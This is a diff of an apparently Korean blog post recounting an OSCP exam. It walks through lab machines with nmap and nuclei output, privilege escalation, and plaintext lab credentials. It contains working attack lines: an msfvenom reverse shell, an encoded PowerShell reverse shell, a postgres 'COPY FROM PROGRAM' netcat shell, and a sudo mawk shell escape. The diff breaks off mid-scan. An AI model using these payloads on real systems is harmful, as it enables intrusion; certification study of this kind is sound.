@@ -43,30 +43,30 @@ AD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 
 Active Directory (Set1 Done)WS26 .206처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.">
     <meta itemprop="datePublished" content="2026-03-10T22:39:02+09:00">
     <meta itemprop="dateModified" content="2026-03-10T22:39:02+09:00">
-    <meta itemprop="wordCount" content="1103">
+    <meta itemprop="wordCount" content="1645">
     <title>OSCP 시험 후기 :: Zenu</title>
-    <link href="/images/favicon.png?1786181568" rel="icon" type="image/png">
-    <link href="/images/favicon.ico?1786181568" rel="icon" type="image/x-icon" sizes="any">
-    <link href="/css/auto-complete/auto-complete.min.css?1786181568" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1786181568" defer></script>
-    <script src="/js/search-lunr.js?1786181568" defer></script>
-    <script src="/js/search.js?1786181568" defer></script>
+    <link href="/images/favicon.png?1786870015" rel="icon" type="image/png">
+    <link href="/images/favicon.ico?1786870015" rel="icon" type="image/x-icon" sizes="any">
+    <link href="/css/auto-complete/auto-complete.min.css?1786870015" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1786870015" defer></script>
+    <script src="/js/search-lunr.js?1786870015" defer></script>
+    <script src="/js/search.js?1786870015" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1786181568";
+      window.relearn.index_js_url="/searchindex.en.js?1786870015";
     </script>
-    <script src="/js/lunr/lunr.min.js?1786181568" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1786181568" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1786181568" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1786181568" defer></script>
+    <script src="/js/lunr/lunr.min.js?1786870015" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1786870015" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1786870015" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1786870015" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/all.min.css?1786181568" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1786181568" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1786181568" rel="stylesheet">
-    <link href="/css/theme.css?1786181568" rel="stylesheet">
-    <link href="/css/format-html.css?1786181568" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/all.min.css?1786870015" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1786870015" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1786870015" rel="stylesheet">
+    <link href="/css/theme.css?1786870015" rel="stylesheet">
+    <link href="/css/format-html.css?1786870015" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -149,6 +149,15 @@ Active Directory (Set1 Done)WS26 .206처음 크레덴셜이 ( r.andrews / Busy
   <ul>
     <li><a href="#112---pwned">112 - Pwned</a></li>
     <li><a href="#111---localtxt">111 - local.txt</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#nmap">nmap</a></li>
+    <li><a href="#web">web</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#nmap-1">nmap</a></li>
   </ul>
 </nav>
                 </div>
@@ -348,14 +357,14 @@ Active Directory (Set1 Done)WS26 .206처음 크레덴셜이 ( r.andrews / Busy
 </ul>
 <p><code>xfreerdp3 /v:192.168.123.206 /u:r.andrews /p:'BusyOfficeWorker890'</code></p>
 <p>Tasks 폴더에 스케줄 작업이 있다.</p>
-<p><a href="#R-image-843886e7964730ef5fa4ea713bafd8ec" class="lightbox-link"><img alt="taskschedule" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/task_schedule.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-843886e7964730ef5fa4ea713bafd8ec"><img alt="taskschedule" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/task_schedule.png"></a></p>
+<p><a href="#R-image-7877c0ead427d30faf1cd35fe7e19765" class="lightbox-link"><img alt="taskschedule" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/task_schedule.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-7877c0ead427d30faf1cd35fe7e19765"><img alt="taskschedule" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/task_schedule.png"></a></p>
 <p>파일 이름 확인</p>
-<p><a href="#R-image-8745bf04068949044730e598af574206" class="lightbox-link"><img alt="taskschedule2" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/task_schedule2.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-8745bf04068949044730e598af574206"><img alt="taskschedule2" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/task_schedule2.png"></a></p>
+<p><a href="#R-image-44bd0838f358c82b42b6564bfafc2add" class="lightbox-link"><img alt="taskschedule2" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/task_schedule2.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-44bd0838f358c82b42b6564bfafc2add"><img alt="taskschedule2" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/task_schedule2.png"></a></p>
 <p>쓰기권한 확인</p>
-<p><a href="#R-image-d8d65721070fc4bdb7bb9722752d9ef8" class="lightbox-link"><img alt="writepermission" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/writepermission.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-d8d65721070fc4bdb7bb9722752d9ef8"><img alt="writepermission" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/writepermission.png"></a></p>
+<p><a href="#R-image-688a03dce4d8af25b21d67a65f04cbf5" class="lightbox-link"><img alt="writepermission" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/writepermission.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-688a03dce4d8af25b21d67a65f04cbf5"><img alt="writepermission" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/writepermission.png"></a></p>
 <p>msfvenom으로 리버스쉘을 만든 후 배치.</p>
 <p><code>msfvenom -p cmd/windows/reverse_powershell lhost=192.168.49.123 lport=443 &gt; task.bat</code></p>
 <p>관리자 접속 후 notes.db 파일 발견.</p>
@@ -372,8 +381,8 @@ svc_sql : SQLPoworiouse333</code></pre></div>
 <h1 id="standalone-machines">Standalone machines<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
 <h2 id="112---pwned">112 - Pwned<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>ftp anonymous login -&gt; 비밀번호 리스트가 적혀있는 pdf 파일 발견.</p>
-<p><a href="#R-image-18b4b8e5781a3909f48718a4e4b58a89" class="lightbox-link"><img alt="passwords" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/standalone/passwords.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-18b4b8e5781a3909f48718a4e4b58a89"><img alt="passwords" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/standalone/passwords.png"></a></p>
+<p><a href="#R-image-d2c0bf626843039a3f36ae0d081b6a23" class="lightbox-link"><img alt="passwords" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/standalone/passwords.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-d2c0bf626843039a3f36ae0d081b6a23"><img alt="passwords" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/standalone/passwords.png"></a></p>
 <p>enum4linux로 유저 리스트 확인.</p>
 <p><code>enum4linux 192.168.122.112</code></p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating users using SID S-1-22-1 and logon username <span style="color:#e6db74">&#39;&#39;</span>, password <span style="color:#e6db74">&#39;&#39;</span>
@@ -398,8 +407,8 @@ svc_sql : SQLPoworiouse333</code></pre></div>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo  /usr/bin/mawk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;</span></span></span></code></pre></div>
 <h2 id="111---localtxt">111 - local.txt<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>feroxbuster로 <code>/launch</code> 디렉토리 발견.</p>
-<p><a href="#R-image-474e7610fabccb0db1a465d034134fbe" class="lightbox-link"><img alt="launch" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/standalone/launch.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-474e7610fabccb0db1a465d034134fbe"><img alt="launch" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/standalone/launch.png"></a></p>
+<p><a href="#R-image-ac0a460ddadae8a9706dea9573c3b664" class="lightbox-link"><img alt="launch" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/standalone/launch.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-ac0a460ddadae8a9706dea9573c3b664"><img alt="launch" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/standalone/launch.png"></a></p>
 <p>Visit launch6 링크를 클릭하면 로그인 페이지가 나온다.</p>
 <p>크레덴셜은 SMB에서 얻을 수 있다.</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbclient -N -L //192.168.123.111
@@ -427,10 +436,165 @@ svc_sql : SQLPoworiouse333</code></pre></div>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>grep -i password -r .
 ./2023_Week38/20230922084703.msg:  The password will be our default one, used after a password reset: Voltaic1992</code></pre></div>
 <p>아까 발견한 로그인 페이지에 로그인한다.</p>
-<p><a href="#R-image-c19885fc48a62c87b65002fafc0531c4" class="lightbox-link"><img alt="powershell" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/standalone/powershell.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-c19885fc48a62c87b65002fafc0531c4"><img alt="powershell" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/standalone/powershell.png"></a></p>
+<p><a href="#R-image-65796fbbd07b332b40c4b85a93db4db9" class="lightbox-link"><img alt="powershell" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/standalone/powershell.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-65796fbbd07b332b40c4b85a93db4db9"><img alt="powershell" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/standalone/powershell.png"></a></p>
 <p>로그인하면 파워쉘 창이 나오고 리버스쉘 코드를 보내서 연결할 수 있다.</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMgAzACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA</code></pre></div>
+<h1 id="110---pwned">110 - Pwned<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<h2 id="nmap">nmap<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PORT     STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>21/tcp   open  ftp        vsftpd 3.0.5
+</span></span><span style="display:flex;"><span>|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ftp-syst:
+</span></span><span style="display:flex;"><span>|   STAT:
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to 192.168.49.96
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.5 - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 43:5c:c0:36:35:2e:9d:17:7a:5d:62:e5:57:15:a0:c9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e2:5e:b2:4e:13:3a:7a:8d:77:f1:a8:8a:b5:0c:14:85 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http       Apache httpd 2.4.52 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: OSCP
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql      MariaDB 5.5.5-10.6.22
+</span></span><span style="display:flex;"><span>| mysql-info:
+</span></span><span style="display:flex;"><span>|   Protocol: <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>|   Version: 5.5.5-10.6.22-MariaDB-0ubuntu0.22.04.1
+</span></span><span style="display:flex;"><span>|   Thread ID: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>|   Capabilities flags: <span style="color:#ae81ff">63486</span>
+</span></span><span style="display:flex;"><span>|   Some Capabilities: ConnectWithDatabase, FoundRows, SupportsTransactions, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsCompression, ODBCClient, Speaks41ProtocolNew, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
+</span></span><span style="display:flex;"><span>|   Status: Autocommit
+</span></span><span style="display:flex;"><span>|   Salt: wrT-!_&lt;JCQLiM%o#<span style="color:#f92672">]</span>+<span style="color:#f92672">[</span>i
+</span></span><span style="display:flex;"><span>|_  Auth Plugin Name: mysql_native_password
+</span></span><span style="display:flex;"><span>5432/tcp open  postgresql PostgreSQL DB 14.7 - 14.9
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>oscp
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:oscp
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-05-02T14:26:17
+</span></span><span style="display:flex;"><span>|_Not valid after:  2033-04-29T14:26:17
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div>
+<h2 id="web">web<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p><a href="#R-image-585d90ba68c22f895784600564ab6d80" class="lightbox-link"><img alt="web" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/standalone/image.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-585d90ba68c22f895784600564ab6d80"><img alt="web" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/standalone/image.png"></a></p>
+<ul>
+<li>nuclei 툴 사용</li>
+</ul>
+<p>(nuclei 써도 되는지 찝찝한데 그 때는 브루트포스로 postgres의 비밀번호를 찾으면 된다)</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nuclei -target http://192.168.96.110
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>CVE-2023-48795<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>javascript<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>medium<span style="color:#f92672">]</span> 192.168.96.110:22 <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Vulnerable to Terrapin&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ssh-auth-methods<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>javascript<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>info<span style="color:#f92672">]</span> 192.168.96.110:22 <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;[&#34;</span>publickey<span style="color:#e6db74">&#34;,&#34;</span>password<span style="color:#e6db74">&#34;]&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pgsql-default-db<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>javascript<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>high<span style="color:#f92672">]</span> 192.168.96.110:5432 <span style="color:#f92672">[</span>FQDN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.96.110&#34;</span>,Host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.96.110&#34;</span>,Hostname<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.96.110:5432&#34;</span>,Port<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;5432&#34;</span>,database<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;postgres&#34;</span>,password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amber&#34;</span>,usernames<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;postgres&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ssh-password-auth<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>javascript<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>info<span style="color:#f92672">]</span> 192.168.96.110:22
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ssh-sha1-hmac-algo<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>javascript<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>info<span style="color:#f92672">]</span> 192.168.96.110:22
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ssh-server-enumeration<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>javascript<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>info<span style="color:#f92672">]</span> 192.168.96.110:22 <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pgsql-default-db<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>javascript<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>high<span style="color:#f92672">]</span> 192.168.96.110:5432 <span style="color:#f92672">[</span>FQDN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.96.110&#34;</span>,Host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.96.110&#34;</span>,Hostname<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.96.110:5432&#34;</span>,Port<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;5432&#34;</span>,database<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;template1&#34;</span>,password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amber&#34;</span>,usernames<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;postgres&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ftp-weak-credentials<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>high<span style="color:#f92672">]</span> 192.168.96.110:21 <span style="color:#f92672">[</span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;123456&#34;</span>,username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ftp&#34;</span><span style="color:#f92672">]</span></span></span></code></pre></div>
+<p><code>postgres:amber</code>가 나옴.</p>
+<ul>
+<li>postgres 접속 후 리버스쉘 연결</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>psql -h 192.168.96.110 -U postgres -d postgres</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>CREATE TABLE shell<span style="color:#f92672">(</span>output text<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>COPY shell FROM PROGRAM <span style="color:#e6db74">&#39;busybox nc 192.168.49.96 443 -e /bin/bash&#39;</span>;</span></span></code></pre></div>
+<p>또 다른 방법은 <code>/etc/passwd</code> 파일에서 유저 <em>betty</em> 확인 후 브루트포스.</p>
+<ul>
+<li>
+<p>betty 홈 디렉토리에서 local.txt 발견</p>
+</li>
+<li>
+<p>pspy 다운로드 &amp; 실행</p>
+</li>
+</ul>
+<p>root의 비밀번호가 보임.</p>
+<p><a href="#R-image-37aba27fcf0cf169d8d7e4c8d6761f7a" class="lightbox-link"><img alt="root" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/standalone/110-2.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-37aba27fcf0cf169d8d7e4c8d6761f7a"><img alt="root" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/standalone/110-2.png"></a></p>
+<p><code>root:AnotherLifeAdventure091</code></p>
+<h1 id="111---pwned">111 - Pwned<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<ul>
+<li>내가 본 머신 중에 제일 간단</li>
+</ul>
+<h2 id="nmap-1">nmap<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>21/tcp   open  ftp           Microsoft ftpd
+</span></span><span style="display:flex;"><span>| ftp-syst:
+</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| 05-13-26  12:35PM       &lt;DIR&gt;          configs
+</span></span><span style="display:flex;"><span>| 05-13-26  12:35PM       &lt;DIR&gt;          logs
+</span></span><span style="display:flex;"><span>| 05-13-26  12:35PM                  <span style="color:#ae81ff">128</span> README.txt
+</span></span><span style="display:flex;"><span>| 06-04-26  02:10PM                <span style="color:#ae81ff">57344</span> SAM
+</span></span><span style="display:flex;"><span>| 05-13-26  12:35PM       &lt;DIR&gt;          scripts
+</span></span><span style="display:flex;"><span>| 06-04-26  02:10PM             <span style="color:#ae81ff">11448320</span> SYSTEM
+</span></span><span style="display:flex;"><span>|_06-04-26  02:10PM                   <span style="color:#ae81ff">75</span> web.config
+</span></span><span style="display:flex;"><span>80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-title: Offsec <span style="color:#ae81ff">\x</span>E2<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">94</span> Employee Portal
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-08-09T04:27:14+00:00; +1s from scanner time.
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info:
+</span></span><span style="display:flex;"><span>|   Target_Name: OSCP
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: OSCP
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: OSCP
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: OSCP
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: OSCP
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.22000
+</span></span><span style="display:flex;"><span>|_  System_Time: 2026-08-09T04:27:09+00:00
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>OSCP
